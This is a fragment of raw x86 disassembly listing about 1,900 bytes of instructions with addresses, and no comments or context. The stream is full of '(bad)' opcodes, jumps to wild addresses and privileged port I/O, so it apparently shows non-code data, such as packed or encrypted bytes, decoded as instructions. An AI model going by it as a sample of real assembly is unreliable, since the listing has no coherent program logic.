  41ae0e:	hlt    
  41ae0f:	aam    0xae
  41ae11:	test   DWORD PTR [ebx],0xe60e9290
  41ae17:	pop    ss
  41ae18:	jbe    0x41ae2a
  41ae1a:	jmp    0xf56fe1b2
  41ae1f:	pushf  
  41ae20:	sub    al,0xd5
  41ae22:	call   0xaf2660ba
  41ae27:	xchg   edi,eax
  41ae28:	inc    ebp
  41ae29:	sbb    eax,0xee445065
  41ae2e:	jmp    0xef19dfe8
  41ae33:	push   cs
  41ae34:	bound  ecx,QWORD PTR [edi]
  41ae36:	jmp    0xc5dce7ce
  41ae3b:	jno    0x41adf0
  41ae3d:	push   cs
  41ae3e:	jmp    0xe9c4633e
  41ae43:	xchg   ebx,eax
  41ae44:	cmp    ebx,edi
  41ae46:	shl    ebp,0xce
  41ae49:	in     eax,dx
  41ae4a:	into   
  41ae4b:	mov    bh,0xae
  41ae4d:	js     0x41ae39
  41ae4f:	dec    esi
  41ae50:	fcom   DWORD PTR [eax]
  41ae52:	and    DWORD PTR [ebp+0x68f6f0],edx
  41ae58:	add    BYTE PTR [eax],al
  41ae5a:	add    BYTE PTR [eax],al
  41ae5c:	aad    0x62
  41ae5e:	adc    cl,ch
  41ae60:	xchg   ebx,eax
  41ae61:	cmp    ebx,ebp
  41ae63:	xchg   ecx,eax
  41ae64:	mov    ecx,0xee9100b
  41ae69:	add    eax,0x4513611e
  41ae6e:	out    dx,al
  41ae6f:	jmp    0x35dd4c9d
  41ae74:	js     0x41ae04
  41ae76:	aas    
  41ae77:	sbb    DWORD PTR [esi],edi
  41ae79:	jecxz  0x41aebc
  41ae7b:	jbe    0x41ae03
  41ae7d:	dec    edx
  41ae7e:	add    DWORD PTR [ecx],ebp
  41ae80:	mov    WORD PTR [ecx],?
  41ae82:	iret   
  41ae83:	out    0xf8,eax
  41ae85:	int3   
  41ae86:	daa    
  41ae87:	mov    ebp,0xe562a4cf
  41ae8c:	adc    BYTE PTR [ebx+eax*1],bh
  41ae8f:	int3   
  41ae90:	aam    0x81
  41ae92:	xlat   BYTE PTR ds:[ebx]
  41ae93:	add    BYTE PTR [edi+0x39],bl
  41ae96:	pop    edx
  41ae97:	inc    esp
  41ae98:	cdq    
  41ae99:	fcom   DWORD PTR [eax]
  41ae9b:	pop    eax
  41ae9c:	bound  ebx,QWORD PTR [eax+0x61]
  41ae9f:	adc    al,0xb4
  41aea1:	(bad)  [edx]
  41aea3:	pop    eax
  41aea4:	mov    al,0x4c
  41aea6:	out    dx,al
  41aea7:	(bad)  
  41aea8:	cmp    DWORD PTR [eax+0x47],ebx
  41aeab:	daa    
  41aeac:	sub    BYTE PTR [eax-0x17b2ab67],dh
  41aeb2:	mul    DWORD PTR [ebx]
  41aeb4:	mov    edx,0x33750f44
  41aeb9:	xor    eax,0xaf712482
  41aebe:	push   cs
  41aebf:	add    BYTE PTR [eax],al
  41aec1:	add    BYTE PTR [eax],al
  41aec3:	add    BYTE PTR [eax],al
  41aec5:	pusha  
  41aec6:	dec    ebp
  41aec7:	out    dx,al
  41aec8:	(bad)  
  41aec9:	stc    
  41aeca:	push   edi
  41aecb:	sub    esp,DWORD PTR [edi]
  41aecd:	clc    
  41aece:	scas   eax,DWORD PTR es:[edi]
  41aecf:	cdq    
  41aed0:	xchg   esp,eax
  41aed1:	lea    esi,[esi-0x12]
  41aed4:	(bad)  
  41aed5:	jmp    0x8dccc12e
  41aeda:	xchg   edx,eax
  41aedb:	push   es
  41aedc:	lea    ebp,[ebp+0x74502e92]
  41aee2:	cmp    dh,BYTE PTR [edx]
  41aee4:	sbb    al,0xe8
  41aee6:	scas   eax,DWORD PTR es:[edi]
  41aee7:	push   cs
  41aee8:	call   0x2cc48d
  41aeed:	sub    al,0x6e
  41aeef:	sbb    edx,DWORD PTR [ebp+0x75ae32e9]
  41aef5:	mov    bl,0x7c
  41aef7:	into   
  41aef8:	data16 and BYTE PTR [edx],dh
  41aefb:	xor    bl,BYTE PTR [eax]
  41aefd:	mov    eax,0x17b90eaf
  41af02:	scas   al,BYTE PTR es:[edi]
  41af03:	push   cs
  41af04:	add    BYTE PTR [edx+esi*1],dh
  41af07:	xor    ah,BYTE PTR [edx]
  41af09:	jp     0x41aeba
  41af0b:	push   cs
  41af0c:	mov    BYTE PTR [ecx-0x6f8aaa12],dl
  41af12:	fistp  WORD PTR [ebp-0x62c25395]
  41af18:	add    al,0x13
  41af1a:	loope  0x41af32
  41af1c:	push   eax
  41af1d:	adc    eax,0xd50160c
  41af22:	and    eax,0x92a3500e
  41af27:	cli    
  41af28:	dec    edi
  41af29:	add    BYTE PTR [eax],al
  41af2b:	add    BYTE PTR [eax],al
  41af2d:	add    BYTE PTR [esp+ecx*4],cl
  41af30:	jmp    0x6e95ffb8
  41af35:	aad    0x90
  41af37:	pop    ecx
  41af38:	adc    cl,BYTE PTR [ebx-0x6d92e4]
  41af3e:	das    
  41af3f:	pop    ecx
  41af40:	popf   
  41af41:	lock sbb dl,BYTE PTR ds:0x7728483e
  41af48:	xor    bh,ch
  41af4a:	pop    ss
  41af4b:	or     edi,DWORD PTR [esp+eax*1+0x69]
  41af4f:	pop    eax
  41af50:	ret    
  41af51:	add    BYTE PTR [esi],0x49
  41af54:	fs in  al,dx
  41af56:	ret    
  41af57:	sbb    DWORD PTR [eax-0x79],esi
  41af5a:	xchg   edx,eax
  41af5b:	out    0x2d,al
  41af5d:	and    al,0x80
  41af5f:	test   eax,0xd642ff7c
  41af64:	ins    DWORD PTR es:[edi],dx
  41af65:	and    esi,DWORD PTR [edx+ebx*2-0x5af6ffee]
  41af6c:	sub    BYTE PTR cs:[ecx],cl
  41af6f:	pop    edx
  41af70:	adc    al,BYTE PTR [eax]
  41af72:	adc    BYTE PTR [ecx+0x754c8743],cl
  41af78:	push   cs
  41af79:	add    esi,0x4812e933
  41af7f:	imul   edx,DWORD PTR [edx+0x0],0x645f190d
  41af86:	or     eax,0x401c2e95
  41af8b:	out    0x2d,al
  41af8d:	and    al,0xac
  41af8f:	mov    dl,0xa7
  41af91:	push   esi
  41af92:	add    BYTE PTR [eax],al
  41af94:	add    BYTE PTR [eax],al
  41af96:	add    cl,ah
  41af98:	das    
  41af99:	je     0x41afba
  41af9b:	and    BYTE PTR [ebx+0x41e003f7],dh
  41afa1:	les    ebx,FWORD PTR [edi]
  41afa3:	mov    ah,0x41
  41afa5:	retf   
  41afa6:	dec    edi
  41afa7:	xor    dl,0xf7
  41afaa:	sbb    BYTE PTR [edi],0x42
  41afad:	lods   al,BYTE PTR ds:[esi]
  41afae:	pop    ds
  41afaf:	xor    BYTE PTR [ecx-0x6d8b904d],0x34
  41afb6:	adc    ah,ah
  41afb8:	mov    ds:0x411103b7,al
  41afbd:	cld    
  41afbe:	jo     0x41af40
  41afc0:	jnp    0x41af7e
  41afc2:	or     esp,DWORD PTR [edx+eiz*8+0x41ad9dff]
  41afc9:	in     eax,dx
  41afca:	(bad)  
  41afcb:	int3   
  41afcc:	stos   BYTE PTR es:[edi],al
  41afcd:	clc    
  41afce:	inc    edi
  41afcf:	ins    BYTE PTR es:[edi],dx
  41afd0:	call   0x8062:0xf284cba0
  41afd7:	mov    bl,0x32
  41afd9:	clc    
  41afda:	add    edx,DWORD PTR [eax-0x4c7f8d1e]
  41afe0:	sahf   
  41afe1:	test   BYTE PTR [ebx],0x90
  41afe4:	loop   0x41b025
  41afe6:	add    edx,DWORD PTR [eax-0x7d06884e]
  41afec:	mov    esi,0x2d9043c8
  41aff1:	je     0x41b013
  41aff3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aff4:	mov    bh,0xf7
  41aff6:	add    ebp,DWORD PTR [esi]
  41aff8:	sub    eax,0x207c
  41affd:	add    BYTE PTR [eax],al
  41afff:	add    BYTE PTR [eax-0x31fc084d],bl
  41b005:	mov    dl,0xf6
  41b007:	sub    al,0x7d
  41b009:	mov    ch,0xd4
  41b00b:	mov    bh,BYTE PTR [ebx]
  41b00d:	xchg   esi,eax
  41b00e:	ret    
  41b00f:	test   BYTE PTR [edx+0xce60eae],bl
  41b015:	mov    ah,0xec
  41b017:	outs   dx,BYTE PTR ds:[esi]
  41b018:	mov    DWORD PTR [edx+0x11],ecx
  41b01b:	call   0x720d:0xbc4cdf93
  41b022:	dec    edx
  41b023:	push   0xe9134150
  41b028:	xchg   ebx,eax
  41b029:	je     0x41b03e
  41b02b:	jmp    0xe628fd42
  41b030:	xchg   ebx,eax
  41b031:	mov    dl,0x41
  41b033:	pushf  
  41b034:	shl    edi,0x76
  41b037:	loope  0x41aff5
  41b039:	test   BYTE PTR [esi],0x72
  41b03c:	cmp    eax,DWORD PTR [edx+0x428f1ec9]
  41b042:	add    DWORD PTR [ecx-0x3adbd46d],ebp
  41b048:	mov    esp,0x5f720ef6
  41b04d:	xchg   edx,eax
  41b04e:	jns    0x41aff5
  41b050:	xchg   ebx,eax
  41b051:	dec    ebx
  41b052:	pop    ebp
  41b053:	push   0x59
  41b055:	scas   al,BYTE PTR es:[edi]
  41b056:	sbb    eax,0xee41816b
  41b05b:	jmp    0x665f382a
  41b060:	push   0xe9ee41
  41b065:	add    BYTE PTR [eax],al
  41b067:	add    BYTE PTR [eax],al
  41b069:	add    esi,esi
  41b06b:	adc    ch,al
  41b06d:	jg     0x41aff2
  41b06f:	xchg   ecx,eax
  41b070:	inc    esp
  41b071:	nop
  41b072:	inc    ecx
  41b073:	arpl   ax,si
  41b075:	loopne 0x41b06c
  41b077:	adc    ch,cl
  41b079:	xor    DWORD PTR [edx+0x3399340e],0x6c
  41b080:	in     eax,dx
  41b081:	mov    ebp,es
  41b083:	or     al,0x96
  41b085:	push   eax
  41b086:	mov    dh,0xe
  41b088:	leave  
  41b089:	xchg   ebx,eax
  41b08a:	mov    dl,0x62
  41b08c:	hlt    
  41b08d:	sbb    al,0xe4
  41b08f:	push   ss
  41b090:	add    BYTE PTR [edx-0x5b00c019],cl
  41b096:	mov    eax,0x4cad4f99
  41b09b:	mov    edi,0x91b47929
  41b0a0:	shl    BYTE PTR [eax-0x56],0x37
  41b0a4:	aaa    
  41b0a5:	push   0x7b
  41b0a7:	(bad)  
  41b0a8:	(bad)  
  41b0a9:	ins    DWORD PTR es:[edi],dx
  41b0aa:	(bad)  
  41b0ab:	mov    ecx,0xeb391e9
  41b0b0:	add    ah,bl
  41b0b2:	aaa    
  41b0b3:	xor    bl,BYTE PTR [edx]
  41b0b5:	push   0xffffffb4
  41b0b7:	push   cs
  41b0b8:	call   0x2fd5a0
  41b0bd:	mov    dl,0x43
  41b0bf:	not    BYTE PTR [eax+0x6aeb3b15]
  41b0c5:	sub    ch,cl
  41b0c7:	js     0x41b0cb
  41b0c9:	add    BYTE PTR [eax+0xf12],cl
  41b0cf:	add    BYTE PTR [eax],al
  41b0d1:	add    bl,bh
  41b0d3:	dec    esp
  41b0d4:	ins    DWORD PTR es:[edi],dx
  41b0d5:	(bad)  
  41b0d6:	mov    esi,DWORD PTR [esi+ecx*1-0x9965e00]
  41b0dd:	xchg   esp,eax
  41b0de:	(bad)  
  41b0df:	mov    ah,0xe
  41b0e1:	test   DWORD PTR [ecx+0x56a6cbb],edi
  41b0e7:	sub    ebx,DWORD PTR [edx+0x24]
  41b0ea:	std    
  41b0eb:	out    0x3e,al
  41b0ed:	push   esi
  41b0ee:	mov    edx,0xc115ebe3
  41b0f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0f4:	dec    esi
  41b0f5:	add    BYTE PTR [esi+esi*2+0x6c],dh
  41b0f9:	imul   edx,DWORD PTR [edi+0x7d],0xcfb7444a
  41b100:	sbb    al,BYTE PTR [ebx+0x5d69a301]
  41b106:	jmp    0x6f2:0x6d89746e
  41b10d:	adc    DWORD PTR [eax-0x7b8ceeda],0xffffffde
  41b114:	ds and al,0x40
  41b117:	repnz out dx,eax
  41b119:	call   FWORD PTR [edi+0x6d08fa49]
  41b11f:	dec    edx
  41b120:	adc    cl,BYTE PTR [ebx-0x16bd8a1c]
  41b126:	mov    bl,0xcc
  41b128:	out    0x0,eax
  41b12a:	add    eax,0xac9397b4
  41b12f:	mov    DWORD PTR [edx],edx
  41b131:	add    BYTE PTR [eax+0xffcd22],dl
  41b137:	add    BYTE PTR [eax],al
  41b139:	add    BYTE PTR [eax],al
  41b13b:	addr16 dec ecx
  41b13d:	cli    
  41b13e:	in     al,dx
  41b13f:	mov    ah,0x4a
  41b141:	adc    cl,BYTE PTR [ebx-0x2d5304]
  41b147:	dec    edi
  41b148:	dec    ecx
  41b149:	stc    
  41b14a:	add    ebx,DWORD PTR [ebx]
  41b14c:	std    
  41b14d:	or     eax,0xe150d14
  41b152:	sbb    al,ah
  41b154:	(bad)  
  41b155:	xchg   esi,eax
  41b156:	and    eax,DWORD PTR [edx+ecx*2+0x52380012]
  41b15d:	(bad)  
  41b15e:	cld    
  41b15f:	pop    ds
  41b160:	(bad)  
  41b161:	ror    BYTE PTR [edi*8-0x7a407178],cl
  41b168:	push   ebx
  41b169:	and    eax,eax
  41b16b:	outs   dx,BYTE PTR ds:[esi]
  41b16c:	ret    0x236d
  41b16f:	mov    al,ds:0x3900124a
  41b174:	ja     0x41b189
  41b176:	add    BYTE PTR [eax-0x75dc9222],dl
  41b17c:	dec    esp
  41b17d:	adc    al,BYTE PTR [eax]
  41b17f:	or     BYTE PTR [ecx+0x52],dl
  41b182:	inc    edi
  41b183:	pop    ebp
  41b184:	add    ebx,DWORD PTR [ecx+0x16711304]
  41b18a:	push   eax
  41b18b:	adc    eax,0x60083cb2
  41b190:	sub    eax,0x4a482024
  41b195:	(bad)  
  41b196:	mov    ecx,0xc3743eac
  41b19b:	and    esi,ebx
  41b19d:	bound  ecx,QWORD PTR [edi+0x0]
  41b1a0:	add    BYTE PTR [eax],al
  41b1a2:	add    BYTE PTR [eax],al
  41b1a4:	je     0x41b160
  41b1a6:	popa   
  41b1a7:	inc    edi
  41b1a8:	je     0x41b19c
  41b1aa:	(bad)  
  41b1ab:	in     al,0xaa
  41b1ad:	cmp    eax,0x7111427d
  41b1b2:	cld    
  41b1b3:	cmp    BYTE PTR [eax-0x5d],0xc9
  41b1b7:	in     eax,0xc0
  41b1b9:	jb     0x41b199
  41b1bb:	mov    WORD PTR [ecx+0x655f384a],ss
  41b1c1:	ds pop edi
  41b1c3:	aas    
  41b1c4:	mov    ah,0xa6
  41b1c6:	sar    edi,0xa
  41b1c9:	neg    DWORD PTR [ebx]
  41b1cb:	sbb    al,0xe0
  41b1cd:	enter  0x88f3,0x13
  41b1d1:	xchg   edi,eax
  41b1d2:	jnp    0x41b1d7
  41b1d4:	nop
  41b1d5:	mov    dl,0xa7
  41b1d7:	mov    BYTE PTR [ebx],ah
  41b1d9:	xchg   edi,eax
  41b1da:	xlat   BYTE PTR ds:[ebx]
  41b1db:	add    al,0x90
  41b1dd:	mov    dl,0xf
  41b1df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1e0:	mov    eax,0x4789f7b3
  41b1e5:	dec    ebx
  41b1e6:	repnz add edx,DWORD PTR [eax+0x790b8fb2]
  41b1ed:	div    bh
  41b1ef:	mul    BYTE PTR [edx-0x6fbc15b6]
  41b1f5:	(bad)  ds:0x21720a57
  41b1fb:	adc    ebx,0x3a
  41b1fe:	hlt    
  41b1ff:	add    edx,DWORD PTR [eax+0x903fc70]
  41b205:	mov    al,0x17
  41b207:	imul   eax,DWORD PTR [eax],0x0
  41b20d:	dec    esp
  41b20e:	mov    dl,0xe
  41b210:	ror    DWORD PTR [esi+0x45],0xf
  41b214:	jmp    0x12704329
  41b219:	push   eax
  41b21a:	mov    dl,0xe
  41b21c:	push   0xffffff97
  41b21e:	xchg   esi,eax
  41b21f:	jns    0x41b24e
  41b221:	xchg   esp,eax
  41b222:	mov    dl,0xd1
  41b224:	cmp    dl,BYTE PTR [esi-0x19]
  41b227:	jbe    0x41b21a
  41b229:	sub    dh,dh
  41b22b:	push   cs
  41b22c:	jb     0x41b1d0
  41b22e:	or     cl,0x76
  41b231:	lahf   
  41b232:	inc    edx
  41b233:	add    DWORD PTR [ecx],ebp
  41b235:	mov    WORD PTR [edx-0x22],cs
  41b238:	test   WORD PTR [esi],di
  41b23b:	call   0x18b2:0xf9a297dd
  41b242:	scas   eax,DWORD PTR es:[edi]
  41b243:	xchg   ecx,eax
  41b244:	push   eax
  41b245:	cwde   
  41b246:	rol    BYTE PTR [edi+0x2],0x55
  41b24a:	mov    BYTE PTR [ebx+0x36],0x96
  41b24e:	mov    dh,0xe
  41b250:	jmp    0xaaa444e8
  41b255:	adc    BYTE PTR [ebx+ebx*1-0x61],al
  41b259:	test   DWORD PTR [ebp+edx*2-0x1b],eax
  41b25d:	xchg   edx,eax
  41b25e:	(bad)  
  41b25f:	bound  ebx,QWORD PTR es:[edi-0x6c5a866a]
  41b266:	sub    DWORD PTR [ebx],eax
  41b268:	fcomp  st(2)
  41b26a:	pushf  
  41b26b:	jns    0x41b212
  41b26d:	xchg   ebx,eax
  41b26e:	dec    edx
  41b26f:	jl     0x41b26f
  41b271:	add    BYTE PTR [eax],al
  41b273:	add    BYTE PTR [eax],al
  41b275:	add    BYTE PTR [ebx-0x7fd66d4e],dl
  41b27b:	popf   
  41b27c:	in     eax,dx
  41b27d:	pop    ds
  41b27e:	xor    ebx,DWORD PTR [ebp-0x4c73da87]
  41b284:	adc    ecx,DWORD PTR ds:0x370ef679
  41b28a:	cmp    al,0x3f
  41b28c:	add    al,0x0
  41b28e:	mov    ch,0xac
  41b290:	dec    esi
  41b291:	add    BYTE PTR [edx+0x3f],ah
  41b294:	in     eax,dx
  41b295:	add    al,0x9d
  41b297:	retf   
  41b298:	push   edx
  41b299:	add    BYTE PTR [edx],bh
  41b29b:	std    
  41b29c:	sbb    DWORD PTR [ebx-0x1e],eax
  41b29f:	xchg   BYTE PTR [edi],cl
  41b2a1:	sub    al,BYTE PTR ss:[esi+0x1a]
  41b2a5:	jae    0x41b300
  41b2a7:	leave  
  41b2a8:	push   ss
  41b2a9:	imul   ebp,DWORD PTR [ebp-0x4a],0xffffffeb
  41b2ad:	adc    eax,0x4ea301
  41b2b2:	sub    al,0x5a
  41b2b4:	dec    ebx
  41b2b5:	pop    esi
  41b2b6:	jbe    0x41b2e5
  41b2b8:	scas   al,BYTE PTR es:[edi]
  41b2b9:	pop    ebx
  41b2ba:	cmp    edi,DWORD PTR [esi+ebp*8]
  41b2bd:	and    ch,0x87
  41b2c0:	in     eax,dx
  41b2c1:	jmp    FWORD PTR [ecx-0x1d]
  41b2c4:	inc    ecx
  41b2c5:	mov    edx,DWORD PTR ds:0x7901229c
  41b2cb:	mov    al,0x44
  41b2cd:	mov    ebp,DWORD PTR [eax+ebp*4]
  41b2d0:	inc    ebx
  41b2d1:	mov    edx,eax
  41b2d3:	mov    esp,0xfcbd0fad
  41b2d8:	in     eax,dx
  41b2d9:	inc    DWORD PTR [eax]
  41b2db:	add    BYTE PTR [eax],al
  41b2dd:	add    BYTE PTR [eax],al
  41b2df:	cmp    DWORD PTR [ebx],esi
  41b2e1:	dec    esi
  41b2e2:	or     al,0x29
  41b2e4:	dec    ecx
  41b2e5:	mov    eax,0x98b02900
  41b2ea:	push   es
  41b2eb:	inc    ebp
  41b2ec:	xchg   ecx,eax
  41b2ed:	bound  edx,QWORD PTR [edx*2+0x550c62f0]
  41b2f4:	out    0x62,al
  41b2f6:	add    al,0xdb
  41b2f8:	pop    edx
  41b2f9:	test   DWORD PTR [ebx],0x6f7b2ca
  41b2ff:	retf   0xf7b1
  41b302:	add    bl,BYTE PTR [edx]
  41b304:	mov    dh,0x54
  41b306:	push   0xffffffe9
  41b308:	inc    eax
  41b309:	arpl   WORD PTR [eax+edx*4],cx
  41b30c:	rcl    al,1
  41b30e:	cld    
  41b30f:	pop    edi
  41b310:	push   ecx
  41b311:	retf   0x357a
  41b314:	dec    ebx
  41b315:	adc    cl,BYTE PTR [ecx-0x182f3f40]
  41b31b:	ja     0x41b37c
  41b31d:	adc    al,BYTE PTR [eax]
  41b31f:	or     al,0xa
  41b321:	outs   dx,DWORD PTR ds:[si]
  41b323:	(bad)  
  41b324:	fcmovnbe st,st(5)
  41b326:	sub    BYTE PTR [eax+0x58606649],0x9d
  41b32d:	dec    ecx
  41b32e:	dec    eax
  41b32f:	sbb    al,0x52
  41b331:	sub    dh,BYTE PTR [ebx+0x3b]
  41b334:	leave  
  41b335:	push   ecx
  41b336:	push   eax
  41b337:	xchg   edx,eax
  41b338:	and    BYTE PTR [eax-0x77],cl
  41b33b:	out    0x55,eax
  41b33d:	pop    DWORD PTR [ebx-0x54]
  41b340:	gs inc edx
  41b342:	dec    edi
  41b343:	add    BYTE PTR [eax],al
  41b345:	add    BYTE PTR [eax],al
  41b347:	add    BYTE PTR [ebx],cl
  41b349:	add    al,0xea
  41b34b:	out    0xe1,eax
  41b34d:	pop    ds
  41b34e:	adc    eax,DWORD PTR [eax]
  41b350:	adc    eax,0x5e406789
  41b355:	adc    eax,0xfd921436
  41b35a:	cmp    cl,BYTE PTR ds:0x1c360d1f
  41b360:	lahf   
  41b361:	mov    esp,0x48a62456
  41b366:	push   ecx
  41b367:	or     BYTE PTR [ebx],dl
  41b369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b36a:	push   cs
  41b36b:	mov    edx,0x124a8c
  41b370:	sar    dl,0x8e
  41b373:	dec    ebx
  41b374:	ins    BYTE PTR es:[edi],dx
  41b375:	adc    eax,0x49f11cca
  41b37a:	adc    al,BYTE PTR [ebx-0x74f939b0]
  41b380:	fs ins DWORD PTR es:[edi],dx
  41b382:	and    ch,al
  41b384:	mov    eax,0xebfce12d
  41b389:	mov    cl,0xe1
  41b38b:	leave  
  41b38c:	dec    esp
  41b38d:	jle    0x41b388
  41b38f:	ficom  WORD PTR [ebx-0x18cfc28c]
  41b395:	mov    edx,0xa06305c0
  41b39a:	pusha  
  41b39b:	inc    eax
  41b39c:	mov    BYTE PTR [edx-0x23],cl
  41b39f:	or     eax,0xf370b290
  41b3a4:	adc    al,BYTE PTR [ebp+ecx*8-0x78]
  41b3a8:	push   ebx
  41b3a9:	cmp    esi,DWORD PTR [ebp+0xf2]
  41b3af:	add    BYTE PTR [eax],al
  41b3b1:	push   esp
  41b3b2:	fsubr  QWORD PTR [edx]
  41b3b4:	dec    edi
  41b3b5:	das    
  41b3b6:	jbe    0x41b388
  41b3b8:	add    al,0x90
  41b3ba:	mov    dl,0xb9
  41b3bc:	pop    es
  41b3bd:	nop
  41b3be:	daa    
  41b3bf:	cmp    al,0x28
  41b3c1:	mov    WORD PTR [edi],gs
  41b3c3:	pushf  
  41b3c4:	xor    esp,ecx
  41b3c6:	fisttp WORD PTR ds:0xcbbb195b
  41b3cc:	jle    0x41b43c
  41b3ce:	xor    BYTE PTR [ebp+0x2],dh
  41b3d1:	or     al,0x96
  41b3d3:	stc    
  41b3d4:	add    edx,DWORD PTR [eax-0x6dac41c0]
  41b3da:	test   eax,0xb2920c72
  41b3df:	idiv   DWORD PTR [esi-0x11]
  41b3e2:	mov    ds:0x3a4e903e,al
  41b3e7:	clc    
  41b3e8:	jle    0x41b376
  41b3ea:	xor    eax,0x348cfb20
  41b3ef:	xor    DWORD PTR [eax+edx*4],eax
  41b3f2:	mov    dl,0xf0
  41b3f4:	enter  0x319c,0x9
  41b3f8:	add    al,0x90
  41b3fa:	mov    dl,0x4a
  41b3fc:	dec    ebx
  41b3fd:	sbb    dh,ah
  41b3ff:	bound  ecx,QWORD PTR [edx-0x78]
  41b402:	loop   0x41b385
  41b404:	and    ebx,DWORD PTR [ecx]
  41b406:	imul   ecx,DWORD PTR [edi],0x3a8e5760
  41b40c:	add    eax,edi
  41b40e:	cmp    dh,ch
  41b410:	jmp    0x655fae24
  41b415:	add    BYTE PTR [eax],al
  41b417:	add    BYTE PTR [eax],al
  41b419:	add    BYTE PTR [ebx+0x39],cl
  41b41c:	out    dx,al
  41b41d:	jmp    0xe197e15e
  41b422:	inc    ebx
  41b423:	int3   
  41b424:	psrld  mm2,0x51
  41b428:	into   
  41b429:	call   0xa9d466c1
  41b42e:	xchg   ecx,eax
  41b42f:	cs inc edx
  41b431:	call   0x748366c9
  41b436:	dec    ecx
  41b437:	stos   BYTE PTR es:[edi],al
  41b438:	adc    edx,DWORD PTR ds:[esi-0x147e22d5]
  41b43f:	cmp    dh,ch
  41b441:	jmp    0x6d5fae5d
  41b446:	addr16 cmp esi,ebp
  41b449:	jmp    0x358945a
  41b44e:	test   BYTE PTR [esi],dh
  41b450:	gs ffree st(4)
  41b453:	jno    0x41b4a5
  41b455:	push   ecx
  41b456:	lahf   
  41b457:	stos   BYTE PTR es:[edi],al
  41b458:	psubsw mm2,QWORD PTR [edi]
  41b45b:	stc    
  41b45c:	sbb    eax,0xee39af6c
  41b461:	jmp    0xde74aa44
  41b466:	ret    
  41b467:	sub    eax,edx
  41b469:	ins    BYTE PTR es:[edi],dx
  41b46a:	shr    DWORD PTR [edx+0x363b71f6],1
  41b470:	out    dx,al
  41b471:	gs push esp
  41b473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b474:	xchg   ebx,eax
  41b475:	not    DWORD PTR [edx-0x2793f14e]
  41b47b:	mov    cs,WORD PTR [edx]
  41b47d:	mov    ecx,0x0
  41b482:	add    BYTE PTR [eax-0x4418aa01],dl
  41b488:	mov    dl,0xe
  41b48a:	add    BYTE PTR [ecx],ch
  41b48c:	cmc    
  41b48d:	mov    esi,DWORD PTR ds:0x318b3e91
  41b494:	mov    cl,0xf6
  41b496:	outs   dx,BYTE PTR ds:[esi]
  41b497:	sub    DWORD PTR [esi+ecx*1+0x328aa589],esi
  41b49e:	test   DWORD PTR [ecx],edi
  41b4a0:	mov    dl,0x92
  41b4a2:	out    0xf9,eax
  41b4a4:	mov    ah,0xe
  41b4a6:	mov    esp,DWORD PTR [ebp+0x45830a8a]
  41b4ac:	mov    al,BYTE PTR [esi]
  41b4ae:	add    dl,cl
  41b4b0:	gs xchg edi,eax
  41b4b2:	enter  0x473a,0x14
  41b4b6:	jb     0x41b449
  41b4b8:	mov    bh,0xec
  41b4ba:	xor    cl,0xaa
  41b4bd:	pusha  
  41b4be:	and    DWORD PTR [edx+0x71d636e],esi
  41b4c4:	hlt    
  41b4c5:	adc    al,BYTE PTR [ecx]
  41b4c7:	test   BYTE PTR [edi],dh
  41b4c9:	aaa    
  41b4ca:	shr    BYTE PTR [edx+0x77fa8efc],1
  41b4d0:	mov    edi,0xb76debf4
  41b4d5:	add    al,0x8d
  41b4d7:	test   al,0xac
  41b4d9:	xchg   ebp,eax
  41b4da:	inc    esp
  41b4db:	test   DWORD PTR [esi-0x49881471],esp
  41b4e1:	pop    ecx
  41b4e2:	and    al,0x91
  41b4e4:	mov    eax,0x32ac
  41b4e9:	add    BYTE PTR [eax],al
  41b4eb:	add    BYTE PTR ds:0x68240390,dh
  41b4f1:	jle    0x41b4c9
  41b4f3:	mov    esi,ebp
  41b4f5:	pop    DWORD PTR [esi]
  41b4f7:	mov    ch,ch
  41b4f9:	(bad)  
  41b4fa:	test   DWORD PTR ss:[ecx-0x40],ebp
  41b4fe:	adc    al,0x21
  41b500:	in     eax,0x8f
  41b502:	cmp    ch,bl
  41b504:	cmp    al,0xb7
  41b506:	mov    esi,0xc991908b
  41b50b:	dec    edi
  41b50c:	jnp    0x41b4b6
  41b50e:	fiadd  WORD PTR [esi-0x76f19a34]
  41b514:	fs ins DWORD PTR es:[edi],dx
  41b516:	xor    cl,BYTE PTR [ebx-0xb35aea9]
  41b51c:	add    eax,0x5c89124a
  41b521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b522:	sbb    cl,BYTE PTR [ecx+0x2456c4d8]
  41b528:	mov    al,0xd2
  41b52a:	dec    esi
  41b52b:	and    al,0xa0
  41b52d:	rcl    BYTE PTR [esi+0x24],cl
  41b530:	pushf  
  41b531:	mov    al,0x72
  41b534:	mov    ds:0x6c2456c4,al
  41b539:	rcl    BYTE PTR [esi+0x24],cl
  41b53c:	js     0x41b512
  41b53e:	push   esi
  41b53f:	and    al,0x94
  41b541:	ret    0x2456
  41b544:	ins    BYTE PTR es:[edi],dx
  41b545:	and    al,0x1a
  41b547:	mov    DWORD PTR [ebp+eiz*2+0x36],edx
  41b54b:	call   0x54d374
  41b550:	add    BYTE PTR [eax],al
  41b552:	add    BYTE PTR [eax],al
  41b554:	add    BYTE PTR [ebx],dl
  41b556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b557:	cmp    BYTE PTR ss:[eax-0x3bdb8934],dl
  41b55e:	dec    ecx
  41b55f:	imul   ecx,DWORD PTR [ebx-0x4c],0xac5368f9
  41b566:	mov    cl,0x69
  41b568:	inc    ebx
  41b569:	mov    ah,0xa5
  41b56b:	xchg   edi,eax
  41b56c:	mov    edi,0xd19745dd
  41b571:	in     eax,0x4d
  41b573:	xchg   edi,eax
  41b574:	(bad)  
  41b575:	fld    QWORD PTR [edi+ecx*4+0x4b]
  41b579:	je     0x41b51c
  41b57b:	retf   0x4870
  41b57e:	cmp    ch,0xe8
  41b581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b582:	into   
  41b583:	shl    BYTE PTR [edx-0x7d],cl
  41b586:	mov    dl,0x62
  41b588:	shl    BYTE PTR ds:0x2b7827a4,1
  41b58f:	not    DWORD PTR [ecx+0x1d]
  41b592:	loop   0x41b55f
  41b594:	sbb    BYTE PTR [edi],0x37
  41b597:	ins    BYTE PTR es:[edi],dx
  41b598:	(bad)  
  41b599:	mov    eax,0x112ef887
  41b59e:	xor    eax,0xdc10fef0
  41b5a3:	std    
  41b5a4:	out    dx,al
  41b5a5:	hlt    
